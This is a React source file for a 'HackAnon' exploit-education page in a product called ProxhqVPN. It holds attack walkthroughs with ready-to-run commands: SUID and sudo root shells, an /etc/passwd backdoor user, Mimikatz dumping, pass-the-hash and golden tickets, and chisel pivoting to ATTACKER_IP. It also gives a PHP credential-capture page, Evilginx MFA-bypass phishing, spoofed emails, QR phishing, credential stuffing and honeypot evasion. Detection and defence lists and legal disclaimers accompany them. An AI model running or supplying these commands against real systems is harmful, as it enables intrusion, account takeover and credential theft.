      { title: "SUID binary abuse (run commands as root)", desc: "SUID binaries run with the file owner's permissions (usually root). Many have shell escape functionality.", cmd: `# Find all SUID binaries on the system:\nfind / -perm -u=s -type f 2>/dev/null\n\n# Check GTFOBins for each one:\n# https://gtfobins.github.io/\n\n# Common SUID escalations:\n\n# /usr/bin/find:\nfind . -exec /bin/sh -p \\; -quit\n\n# /usr/bin/vim:\nvim -c ':!/bin/sh'\n\n# /usr/bin/python:\npython3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'\n\n# /usr/bin/cp (overwrite /etc/passwd):\nopenssl passwd -1 attacker123  # generate password hash\necho 'attacker:HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd_new\ncp /tmp/passwd_new /etc/passwd\nsu attacker  # now have UID 0` },
      { title: "Sudo misconfiguration abuse", desc: "sudo -l shows what the current user can run as root. Many configs are dangerously permissive.", cmd: `# Check sudo privileges:\nsudo -l\n\n# Common vulnerable sudo configs (from GTFOBins):\n\n# (ALL) NOPASSWD: /usr/bin/python3\nsudo python3 -c 'import os; os.system("/bin/bash")'\n\n# (ALL) NOPASSWD: /usr/bin/vim\nsudo vim -c ':!/bin/bash'\n\n# (ALL) NOPASSWD: /usr/bin/less\nsudo less /etc/shadow  # then type: !/bin/sh\n\n# (ALL) NOPASSWD: /usr/bin/tar\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n\n# (ALL) NOPASSWD: /usr/bin/awk\nsudo awk 'BEGIN {system("/bin/bash")}'\n\n# sudo token reuse (parallel exploitation of sudo session):\n# If another user ran sudo in the last 15 minutes, steal their token:\nsudo --use-pty -u root /bin/bash  # if NOPASSWD for specific commands, may reuse session` },
      { title: "Windows lateral movement — Pass-the-Hash / Pass-the-Ticket", desc: "On Windows networks, stolen NTLM hashes and Kerberos tickets can authenticate you without knowing the actual password.", cmd: `# Dump credentials from memory with Mimikatz (requires admin/SYSTEM):\nmimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords    # dump all plaintext creds + hashes\nlsadump::sam                # dump SAM database (local accounts)\nlsadump::dcsync /domain:corp.local /user:Administrator  # DCSync attack\n\n# Pass-the-Hash (PTH) with Impacket:\n# Use NTLM hash to authenticate without the plaintext password\npython3 psexec.py -hashes :NTLM_HASH Administrator@10.0.0.5\npython3 wmiexec.py -hashes :NTLM_HASH Administrator@10.0.0.5\npython3 smbexec.py -hashes :NTLM_HASH Administrator@10.0.0.5\n\n# Pass-the-Ticket (Kerberos ticket reuse):\n# Steal a Kerberos ticket from memory:\nmimikatz.exe sekurlsa::tickets /export\n# Import the .kirbi ticket:\nkerberos::ptt ticket.kirbi\n\n# Golden Ticket attack (forge any Kerberos ticket with krbtgt hash):\nmimikatz.exe kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator /ptt` },
      { title: "Internal network pivoting (access isolated segments)", desc: "Use the compromised host as a relay to reach internal networks the attacker's machine can't directly access.", cmd: `# SSH port forwarding (using a compromised Linux box with SSH):\n\n# Dynamic SOCKS proxy (tunnel all traffic through victim):\nssh -D 1080 -N user@VICTIM_IP\n# Then configure proxychains:\necho 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf\nproxychains4 nmap -sT -Pn 10.0.0.0/24\n\n# Local port forward (access internal service on attacker's port):\nssh -L 3306:internal-db.corp:3306 user@VICTIM_IP\nmysql -h 127.0.0.1 -P 3306 -u root  # now connects through victim\n\n# Chisel (tunneling over HTTP — bypasses most firewalls):\n# On attacker:\nchisel server -p 8080 --reverse\n# On victim:\nchisel client ATTACKER_IP:8080 R:1080:socks\n# Now SOCKS5 proxy on attacker:1080 tunnels through victim\n\n# Metasploit route/autoroute:\nroute add 10.0.0.0/8 SESSION_ID  # all 10.x.x.x goes through session\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS 10.0.0.0/24\nrun` },
    ],
    detect: [
      "Ghost Chain maps the full 5-stage kill chain (Recon → Initial Access → Execution → Persistence → Exfiltration) — visualizes lateral movement as a graph",
      "Alert on NTLM authentication from unusual source IPs / workstations",
      "Windows Event ID 4648 (logon with explicit credentials), 4624 Type 3 (network logon) across multiple hosts",
      "Unusual process spawning from SYSTEM/service accounts (psexec, wmiexec pattern: cmd.exe launched by WMI)",
      "SSH logins from internal IPs that have never connected to each other before",
      "Detect DCSync: alert on any non-DC machine requesting DRS replication permissions",
    ],
    defend: [
      "Enable Credential Guard on Windows — prevents LSASS memory dumps",
      "Disable NTLM authentication where possible — enforce Kerberos",
      "Least privilege: service accounts should not have local admin rights on workstations",
      "Network segmentation: database servers should not be reachable from web server VLAN",
      "Log and alert on lateral movement indicators using SIEM (use the ProxhqVPN SIEM aggregator)",
      "Regular auditing of sudo rules, SUID binaries, and service account permissions",
    ],
  },
  {
    id: "phishing-infra",
    title: "Phishing Infrastructure & Credential Harvesting",
    category: "Social Engineering",
    severity: "high",
    icon: Globe,
    platformTool: { label: "OSINT Recon", route: "/osint" },
    summary: "Attackers build convincing fake login pages and deliver them via email, SMS, or QR codes to harvest credentials. OSINT Recon maps the same infrastructure attackers use to fingerprint your brand for cloning.",
    howItWorks: "A phishing attack has three components: (1) a convincing pretext (urgent password reset, IT security alert), (2) a cloned login page that captures submitted credentials before forwarding to the real site, (3) delivery via email/SMS/LinkedIn DM. Modern adversary-in-the-middle (AiTM) phishing frameworks like Evilginx and Modlishka proxy the REAL site, bypassing MFA by capturing session cookies instead of just passwords.",
    steps: [
      { title: "Clone a login page", desc: "Reproduce the target's login page pixel-perfectly. Users see the real design but credentials go to the attacker's server.", cmd: `# HTTrack — mirror an entire login page:\nhttrack https://accounts.target.com/login -O ./phish-site -%e0 -I0\n\n# wget recursive:\nwget -r -l 1 -p -k https://accounts.target.com/login -P ./phish\n\n# GoPhish (full phishing campaign framework):\n# https://getgophish.com\ngophish  # start on :3333 (admin UI)\n\n# After cloning — modify the form action to POST to your handler:\n# Change: <form method="POST" action="https://real.com/login">\n# To:     <form method="POST" action="/capture.php">\n\n# capture.php — log credentials + redirect to real site:\n<?php\n  file_put_contents('/var/log/creds.txt',\n    $_POST['email'].':'.$_POST['password']."\\n",\n    FILE_APPEND);\n  header('Location: https://accounts.target.com/login?error=invalid');\n?>` },
      { title: "Adversary-in-the-Middle (AiTM) phishing — Evilginx", desc: "Evilginx acts as a reverse proxy between the victim and the real site. It captures the session cookie AFTER MFA is completed — bypassing 2FA entirely.", cmd: `# Evilginx2 (AiTM framework):\n# Requires: a VPS, a domain, DNS control\n\n# Install:\ncurl https://api.github.com/repos/kgretzky/evilginx2/releases/latest \\\n  | jq -r '.assets[0].browser_download_url' | xargs curl -L -o evilginx.zip\nunzip evilginx.zip && sudo ./evilginx -p ./phishlets\n\n# Configure inside evilginx:\nconfig domain attacker.com\nconfig ipv4 YOUR_SERVER_IP\n\n# Load a phishlet (pre-built for major sites):\nphishlets hostname o365 login.attacker.com\nphishlets enable o365\n\n# Create a lure (tracking link to send to victim):\nlures create o365\nlures get-url 0  # → https://login.attacker.com/randompath\n\n# How it works: victim visits the URL → sees REAL Microsoft login\n# (Evilginx proxies it in real-time) → submits credentials + MFA\n# → Evilginx captures the authenticated session cookie\n# → Attacker imports cookie to bypass MFA entirely` },
      { title: "Email delivery — SPF/DKIM spoofing", desc: "To make phishing emails appear legitimate, attackers spoof the sender domain or register lookalike domains.", cmd: `# Register lookalike domains (typosquatting):\n# target.com → target-security.com\n# target.com → targett.com\n# target.com → target.co (different TLD)\n\n# Check target's SPF record:\ndig TXT target.com | grep spf\n# If no SPF → domain can be spoofed freely\n# If SPF exists with ~all (softfail) → can still reach inbox\n# Only -all (hardfail) + DMARC reject fully blocks spoofing\n\n# Check DMARC:\ndig TXT _dmarc.target.com\n# No DMARC → SPF pass bypasses all checks\n\n# Send spoofed email via swaks (authorized lab testing only):\nswaks --to victim@target.com \\\n  --from ceo@target.com \\\n  --server mail.attacker.com \\\n  --body 'Click: https://login.attacker.com/reset' \\\n  --header 'Subject: Urgent: Password Reset Required'\n\n# Use GoPhish for full campaign management:\n# Templates, tracking opens/clicks, credential capture dashboard` },
      { title: "QR code phishing (Quishing)", desc: "QR codes bypass email URL scanners. The malicious URL is inside the image — email security tools that don't decode QR codes miss it entirely.", cmd: `# Generate a QR code pointing to your phishing site:\npip install qrcode\npython3 -c "\nimport qrcode\nimg = qrcode.make('https://login.attacker.com/o365/reset')\nimg.save('reset_qr.png')\n"\n\n# Embed in an HTML email:\n<img src='cid:qr' alt='Scan to reset your password' />\n\n# Or in a PDF (scanned QR codes bypass most email gateways):\n# Use fpdf2 to generate a PDF with embedded QR\npip install fpdf2\n\n# Delivery pretext: "Your MFA app needs re-enrollment — scan this QR"\n# Most users will scan without thinking twice` },
      { title: "Harvesting at scale — credential database enrichment", desc: "Once credentials are captured, attackers enrich them with breach data to understand password reuse patterns.", cmd: `# Check harvested credentials against HIBP:\ncurl -s -H "hibp-api-key: KEY" \\\n  'https://haveibeenpwned.com/api/v3/breachedaccount/victim@target.com'\n\n# Password reuse check — test captured password against other services:\n# (authorized red team lab only)\nhydra -l victim@email.com -p 'CapturedP@ss1' \\\n  -M targets.txt https-post-form '/login:user=^USER^&pass=^PASS^:failed'\n\n# Dehashed API (enriches emails with previously leaked passwords):\ncurl -s -H "x-api-key: DEHASHED_KEY" \\\n  'https://api.dehashed.com/search?query=email%3Avictim%40target.com'\n\n# Build a profile: email + phone + addresses from OSINT sources\n# Use ProxhqVPN OSINT Recon for non-invasive fingerprinting` },
    ],
    detect: [
      "DMARC reports: enable DMARC with rua= reporting to see all spoofed emails claiming your domain",
      "Monitor for newly registered lookalike domains (use CertSpotter — attackers need TLS certs for AiTM)",
      "Email gateway: decode QR codes in emails and scan the embedded URLs",
      "Impossible travel / geo-velocity: same account logging in from two countries within 1 hour",
      "Session anomalies: previously seen session cookie suddenly used from a different IP/browser",
      "PhishTank and OpenPhish feeds — check your domains against known phishing databases",
    ],
    defend: [
      "Enforce DMARC with p=reject — not just p=none (monitoring only). Add SPF and DKIM",
      "Deploy hardware security keys (FIDO2/WebAuthn passkeys) — AiTM phishing cannot steal them (domain-bound)",
      "Enroll in Google's Advanced Protection Program for high-value accounts",
      "Register typosquat domains defensively (targett.com, target-security.com) before attackers do",
      "Security awareness training with simulated phishing campaigns (GoPhish) — measure click rates",
      "Conditional Access: require compliant device + location-based access for sensitive apps",
    ],
  },
  {
    id: "deception-evasion",
    title: "Honeypot & Deception Engine Evasion (Attacker Perspective)",
    category: "Evasion",
    severity: "medium",
    icon: Eye,
    platformTool: { label: "Deception Engine", route: "/deception-engine" },
    summary: "Defenders deploy honeypots to detect attackers. Sophisticated attackers try to detect and avoid them. Understanding evasion tactics lets your team build harder-to-evade deception infrastructure. ProxhqVPN's Deception Engine is built with these countermeasures in mind.",
    howItWorks: "Honeypots are fake services designed to attract and fingerprint attackers. Low-interaction honeypots (like common Cowrie/Kippo SSH deployments) have detectable characteristics: too-perfect uptime, unusual banner patterns, missing real OS artifacts, or emulation tells. Experienced attackers fingerprint before interacting. Our Deception Engine mitigates these by using real OS banners, deliberate imperfections, and intentional tarpit delays that mimic real server load.",
    steps: [
      { title: "Honeypot fingerprinting — network-level", desc: "Before connecting to any service, attackers analyze network behavior to detect honeypot characteristics.", cmd: `# 1. TTL analysis — honeypots often run on VMs with standard hypervisor TTLs:\nping target.com  # TTL=64 → Linux VM (normal)\n               # TTL=128 → Windows VM (normal)\n               # TTL=255 → network device (suspicious if it's a 'server')\n\n# 2. TCP fingerprinting — p0f (passive OS detection):\nsudo p0f -i eth0 -p  # passively fingerprints OS from traffic\n\n# 3. Nmap OS detection — honeypot TCP stacks often imperfect:\nnmap -O --osscan-guess target.com\n\n# 4. Port timing analysis — honeypots accept connections too fast:\n# Real SSH servers have slight delays; Cowrie responds instantly\nnc -zv -w2 target.com 22  # measure connection time\n\n# 5. Service fingerprint vs claimed OS:\n# If banner says "Red Hat" but TCP fingerprint says "Windows" → honeypot\nnmap -sV --version-intensity 9 target.com` },
      { title: "SSH honeypot detection (Cowrie tells)", desc: "Cowrie is the most common SSH honeypot. It has several detectable artifacts that experienced attackers probe for.", cmd: `# Cowrie tells:\n\n# 1. /proc/mounts is too clean — real systems have dozens of entries:\nssh user@target 'cat /proc/mounts | wc -l'  # < 5 lines → likely Cowrie\n\n# 2. /etc/issue and /etc/motd don't match:\nssh user@target 'cat /etc/issue; cat /etc/os-release'\n\n# 3. Missing real binaries — Cowrie has a limited fake filesystem:\nssh user@target 'ls /usr/bin | wc -l'  # < 50 → likely fake\nssh user@target 'which htop; which tmux; which git'  # all missing → suspicious\n\n# 4. 'free' command output — Cowrie hardcodes memory:\nssh user@target 'free -m'  # exact same output each run → honeypot\n\n# 5. Process list is always empty or minimal:\nssh user@target 'ps aux | wc -l'  # < 5 → honeypot\n\n# 6. Filesystem write testing:\nssh user@target 'dd if=/dev/urandom of=/tmp/test bs=1M count=100 && du -sh /tmp/test'\n# Cowrie pretends to write but disk usage never actually changes` },
      { title: "Web honeypot detection", desc: "Fake web services (phpmyadmin, wp-login, admin panels) have detectable differences from real ones.", cmd: `# Real phpMyAdmin has a version-specific fingerprint:\ncurl -I https://target.com/phpmyadmin/\n# Check: Server header, response timing, exact HTML structure\n# Honeypot PMA will have wrong version in title or missing CSS files\n\n# Check if the login actually processes input:\ncurl -X POST https://target.com/phpmyadmin/ \\\n  -d 'pma_username=root&pma_password=test&server=1'\n# Real PMA: 302 redirect or error message\n# Honeypot: always returns 200 with same page\n\n# Canary token detection — some honeypots embed unique tracking pixels:\n# Check all image/resource URLs — random unique paths indicate canary tokens\ncurl -I https://target.com/admin/login.php\n# Look for unique IDs in resource URLs: /assets/img/abcd1234.png\n\n# Response timing — real backends have variable response times:\n# Honeypots often respond in constant time (< 50ms always)\nfor i in {1..10}; do curl -w '%{time_total}\\n' -o /dev/null -s https://target.com/phpmyadmin/; done` },
      { title: "Tarpit detection and bypass", desc: "Tarpits deliberately slow responses to waste scanner time. Attackers detect them and skip or set short timeouts.", cmd: `# Tarpit characteristics:\n# - Normal HTTP response takes 30+ seconds\n# - SSH sends data 1 byte per second (Endlessh/LaBrea pattern)\n# - TCP accepts but never completes handshake (SYN tarpit)\n\n# Scanner bypass — set aggressive timeouts:\nnmap -T5 --max-rtt-timeout 100ms --host-timeout 200ms target.com\nmasscan target.com -p22,80,443 --max-rate 10000 --timeout 200\n\n# Detect Endlessh (SSH tarpit):\nnc -w 1 target.com 22  # connect, if no SSH banner in 1 second → tarpit\necho '' | nc -w 1 target.com 22  # if it hangs → Endlessh/tarpit\n\n# Avoid tarpit ports entirely:\n# Common tarpit ports: 22, 23, 25, 110, 143, 3306\n# Use port scanning to identify ports that respond fast vs slow\nnmap -T5 --max-rtt-timeout 200ms -p- target.com 2>/dev/null | grep open` },
      { title: "How our Deception Engine defeats these evasions", desc: "ProxhqVPN's Deception Engine is built to be harder to fingerprint than standard honeypots.", cmd: `# Our countermeasures (visible in Deception Engine → Banners tab):\n\n# 1. Real banners from actual servers — not Cowrie defaults:\n# OpenSSH_8.4p1 Ubuntu-6ubuntu2.1 (Bionic Beaver exact version string)\n# phpMyAdmin 5.1.1 (exact version with real error messages)\n\n# 2. Configurable tarpit delays (not a fixed 200ms):\n# HTTP: 600ms  SSH: 800ms  FTP: 500ms  SMTP: 1200ms\n# Variable delays per-request with ±10% jitter\n\n# 3. Deliberate imperfections to defeat "too-perfect" detection:\n# Random typos in banner text\n# Occasional 500 errors on valid requests\n# Variable response sizes for same request\n\n# 4. Attacker fingerprinting — we fingerprint THEM:\n# Tool signature detection: masscan/zgrab/shodan/nikto UA strings\n# Timing attack detection: >3 requests in 100ms = automated scanner\n# Nmap script detection: HTTP methods probing pattern\n\n# 5. Credential capture — stores everything:\n# Every submitted username/password combo logged to deception_events\n# Full HTTP request body stored in payload_hex field\n# Geo + ASN + ISP + Tor exit status on every hit\n# → View it all in Deception Engine → Live Feed tab` },
    ],
    detect: [
      "Check Deception Engine → Analytics tab for attacker IPs that ran honeypot fingerprinting sequences",
      "Pattern: attacker probes multiple honeypot ports in quick succession then stops (detecting our traps)",
      "Timing anomalies: legitimate users take seconds between page interactions; scanners fire within milliseconds",
      "User-agent strings matching known scanner tools (masscan, zgrab, nuclei, shodan-spider)",
    ],
    defend: [
      "Diversify your honeypot stack — use different platforms so a single fingerprint database doesn't catch all of them",
      "Blend honeypots with real services — if both legitimate and fake /phpmyadmin exist, attackers can't skip all of them",
      "Use canary tokens inside real documents and configs — attacker finds them during recon and triggers an alert",
      "Tune Deception Engine banner text quarterly — rotate versions and response patterns to defeat cached fingerprints",
      "Log ALL probes including unanswered port scans — visibility before the attacker decides to engage is most valuable",
    ],
  },
  // ─── END NEW ENTRIES ─────────────────────────────────────────────────────────
  {
    id: "cred-stuffing",
    title: "Credential Stuffing & Password Spraying",
    category: "Authentication",
    severity: "high",
    icon: Key,
    platformTool: { label: "Intruder", route: "/intruder" },
    summary: "Using leaked credentials from data breaches (billions available on dark web) to attempt login to other services. Password spraying tries a few common passwords against many accounts to avoid lockouts.",
    howItWorks: "Since 60%+ of users reuse passwords, attackers buy breach databases (Collection #1, RockYou2021) and test each email:password pair against the target's login endpoint. Tools like Hydra, Burp Intruder, and credential stuffing frameworks automate this.",
    steps: [
      { title: "Obtain breach data", desc: "Check if target users appear in known breaches (for authorized testing, check HaveIBeenPwned).", cmd: `# Check a specific email (authorized testing)\ncurl -H "hibp-api-key: YOUR_KEY" \\\n  'https://haveibeenpwned.com/api/v3/breachedaccount/user@target.com'\n\n# Dehashed (paid) provides actual password data\n# SecLists has common credential combos for testing:\ngit clone https://github.com/danielmiessler/SecLists\nls SecLists/Passwords/` },
      { title: "Password spraying (avoid lockouts)", desc: "Try one password per account, cycling through accounts slowly to stay under lockout thresholds.", cmd: `# Spray with a single common password across all accounts\nhydra -L userlist.txt -p 'Password123!' target.com http-post-form \\\n  '/api/login:username=^USER^&password=^PASS^:Invalid credentials' \\\n  -t 1 -W 30  # 1 thread, 30s wait between attempts\n\n# Burp Intruder: Cluster Bomb attack\n# Position 1: username (list of users)\n# Position 2: password (short list: Password1, Welcome1, Company123, SeasonYear)` },
      { title: "Credential stuffing at scale", desc: "Test known email:password pairs from breach dumps.", cmd: `# Hydra with combo list (email:password format)\nhydra -C leaked_credentials.txt target.com https-post-form \\\n  '/api/auth/login:email=^USER^&password=^PASS^:incorrect' \\\n  -t 4 -W 2\n\n# Or use Nuclei templates for credential testing:\nnuclei -u https://target.com/login \\\n  -t nuclei-templates/default-logins/ -v` },
    ],
    detect: [
      "Monitor login failure rate per IP and globally — spikes indicate spraying/stuffing",
      "Alert on single IP attempting >5 different accounts in 5 minutes",
      "Geo-velocity detection: same account logging in from two countries within an hour",
      "Device fingerprinting: alert on new devices/user-agents during login",
      "Integrate with HIBP API to notify users when their credentials appear in breaches",
    ],
    defend: [
      "Enforce MFA/2FA — credential theft alone is useless against TOTP/WebAuthn",
      "Implement account lockout with CAPTCHA (not hard lockout — causes DoS)",
      "Rate limit login endpoints: 5 attempts per IP per 15 minutes",
      "Check submitted passwords against HaveIBeenPwned Passwords API at signup/password change",
      "Use passkeys (WebAuthn) — phishing-resistant, no password to steal",
    ],
  },
];

const CATEGORIES = Array.from(new Set(EXPLOITS.map(e => e.category)));

const SEV_BADGE: Record<string, string> = {
  critical: "border-red-500/40 bg-red-900/15 text-red-400",
  high:     "border-orange-500/40 bg-orange-900/15 text-orange-400",
  medium:   "border-yellow-500/40 bg-yellow-900/15 text-yellow-400",
};

export default function HackAnon() {
  const [active, setActive] = useState(EXPLOITS[0].id);
  const [search, setSearch] = useState("");
  const [filterCat, setFilterCat] = useState<string | null>(null);
  const [expandedSteps, setExpandedSteps] = useState<Record<string, boolean>>({});

  const filtered = EXPLOITS.filter(e => {
    const q = search.toLowerCase();
    const matchSearch = !q || e.title.toLowerCase().includes(q) || e.category.toLowerCase().includes(q) || e.summary.toLowerCase().includes(q);
    const matchCat = !filterCat || e.category === filterCat;
    return matchSearch && matchCat;
  });

  const current = EXPLOITS.find(e => e.id === active) ?? EXPLOITS[0];

  return (
    <div className="flex h-[calc(100vh-4rem)] font-mono overflow-hidden">
      {/* Sidebar */}
      <aside className="w-60 shrink-0 border-r border-primary/10 flex flex-col overflow-hidden bg-black/30">
        <div className="p-3 border-b border-primary/10 shrink-0 space-y-2">
          <div className="flex items-center gap-2">
            <div className="w-6 h-6 rounded bg-orange-500/20 border border-orange-500/30 flex items-center justify-center">
              <Bug className="w-3.5 h-3.5 text-orange-400" />
            </div>
            <div>
              <div className="text-[11px] font-bold text-orange-400">HackAnon</div>
              <div className="text-[8px] text-primary/40 uppercase tracking-widest">Exploit Education</div>
            </div>
          </div>
          <div className="border border-yellow-500/20 bg-yellow-900/10 rounded px-2 py-1.5 text-[8px] text-yellow-400/80 leading-relaxed">
            ⚠ For authorized security testing and developer education only. Never attack systems without written permission.
          </div>
          <input
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search exploits…"
            className="w-full bg-black border border-primary/15 text-primary text-[9px] font-mono px-2 py-1 focus:outline-none focus:border-orange-500/40 rounded placeholder:text-primary/20"
          />
          {/* Category filter pills */}
          <div className="flex flex-wrap gap-1">
            <button
              onClick={() => setFilterCat(null)}
              className={`text-[8px] px-1.5 py-0.5 border rounded transition-colors ${!filterCat ? "border-orange-500/40 text-orange-400 bg-orange-900/15" : "border-primary/15 text-primary/30"}`}
            >All</button>
            {CATEGORIES.map(c => (
              <button
                key={c}
                onClick={() => setFilterCat(filterCat === c ? null : c)}
                className={`text-[8px] px-1.5 py-0.5 border rounded transition-colors ${filterCat === c ? "border-orange-500/40 text-orange-400 bg-orange-900/15" : "border-primary/15 text-primary/30"}`}
              >{c}</button>
            ))}
          </div>
        </div>
        <nav className="flex-1 overflow-y-auto py-1">
          {filtered.map(e => {
            const Icon = e.icon;
            return (
              <button
                key={e.id}
                onClick={() => setActive(e.id)}
                className={`w-full text-left px-3 py-2 flex items-center gap-2 text-[10px] transition-colors ${active === e.id ? "bg-orange-500/10 text-orange-400 border-r-2 border-orange-500" : "text-primary/60 hover:text-primary hover:bg-primary/5"}`}
              >
                <Icon className="w-3 h-3 shrink-0" />
                <div className="flex-1 min-w-0">
                  <div className="truncate">{e.title}</div>
                  <div className={`text-[7px] mt-0.5 ${SEV_BADGE[e.severity]?.split(" ")[2] ?? "text-primary/30"}`}>{e.severity.toUpperCase()} · {e.category}</div>
                </div>
              </button>
            );
          })}
          {filtered.length === 0 && (
            <div className="px-4 py-6 text-center text-[9px] text-primary/25">No matches</div>
          )}
        </nav>
        <div className="px-3 py-2 border-t border-primary/10 shrink-0 text-[8px] text-primary/25">
          {EXPLOITS.length} exploit types · HackAnon v2.0
        </div>
      </aside>

      {/* Content */}
      <div className="flex-1 overflow-y-auto">
        <div className="max-w-3xl mx-auto px-6 py-6 space-y-5">
          {/* Header */}
          <div>
            <div className="flex items-center gap-2 mb-3 flex-wrap">
              <div className={`text-[9px] border px-2 py-0.5 font-mono uppercase tracking-widest ${SEV_BADGE[current.severity]}`}>
                {current.severity}
              </div>
              <div className="text-[9px] border border-primary/15 text-primary/40 px-2 py-0.5 font-mono uppercase tracking-widest">
                {current.category}
              </div>
              {current.platformTool && (
                <a
                  href={`${BASE}${current.platformTool.route}`}
                  className="flex items-center gap-1.5 text-[9px] border border-[#00ff88]/30 text-[#00ff88] px-2 py-0.5 font-mono uppercase tracking-widest hover:bg-[#00ff88]/10 transition-colors"
                >
                  <ArrowRight className="w-2.5 h-2.5" />
                  Test with: {current.platformTool.label}
                </a>
              )}
            </div>
            <h1 className="text-xl font-bold text-orange-400">{current.title}</h1>
            <p className="text-[11px] text-primary/60 mt-1 leading-relaxed max-w-2xl">{current.summary}</p>
          </div>

          {/* How it works */}
          <div className="border border-primary/10 rounded p-4 bg-primary/2">
            <div className="text-[9px] font-mono font-bold text-primary/40 uppercase tracking-widest mb-2 flex items-center gap-1.5">
              <BookOpen className="w-3 h-3" /> How It Works
            </div>
            <p className="text-[10px] font-mono text-primary/75 leading-relaxed">{current.howItWorks}</p>
          </div>

          {/* Step-by-step attack */}
          <div>
            <div className="text-[10px] font-mono font-bold text-orange-400 uppercase tracking-widest mb-3 flex items-center gap-2">
              <Terminal className="w-3.5 h-3.5" />
              Step-by-Step: How a Hacker Would Do It
            </div>
            <div className="space-y-4">
              {current.steps.map((step, i) => (
                <div key={i} className="border border-primary/10 rounded p-3 space-y-2">
                  <Step n={i + 1} title={step.title}>
                    {step.desc}
                  </Step>
                  {step.cmd && (
                    <div className="ml-9">
                      <CB label="Attack Command">{step.cmd}</CB>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* Detect & Defend */}
          <Detect items={current.detect} />
          <Defend items={current.defend} />

          {/* ProxhqVPN tool CTA */}
          {current.platformTool && (
            <div className="border border-[#00ff88]/20 bg-[#00ff88]/5 rounded p-4 flex items-center gap-4">
              <Zap className="w-5 h-5 text-[#00ff88] shrink-0" />
              <div className="flex-1">
                <div className="text-[10px] font-bold text-[#00ff88] mb-0.5">Test This in ProxhqVPN</div>
                <div className="text-[9px] text-primary/50">Use <strong className="text-primary/70">{current.platformTool.label}</strong> to actively test this exploit class against authorized targets — all traffic routed through your VPN tunnel.</div>
              </div>
              <a
                href={`${BASE}${current.platformTool.route}`}
                className="shrink-0 flex items-center gap-1.5 text-[10px] border border-[#00ff88]/40 text-[#00ff88] px-3 py-2 hover:bg-[#00ff88]/15 transition-colors"
              >
                Open Tool <ArrowRight className="w-3 h-3" />
              </a>
            </div>
          )}

          {/* Disclaimer */}
          <div className="border border-red-500/15 bg-red-900/8 rounded p-3">
            <div className="flex items-start gap-2">
              <AlertTriangle className="w-3.5 h-3.5 text-red-400/60 shrink-0 mt-0.5" />
              <p className="text-[9px] font-mono text-red-400/70 leading-relaxed">
                <strong>Legal Reminder:</strong> All techniques documented here are for educational purposes and authorized penetration testing only. Unauthorized access to computer systems is illegal under the CFAA (US), Computer Misuse Act (UK), and equivalent laws worldwide. Always obtain written authorization before testing. ALPHA UNLIMITED TECHNOLOGIES LLC and ProxhqVPN are not liable for misuse.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
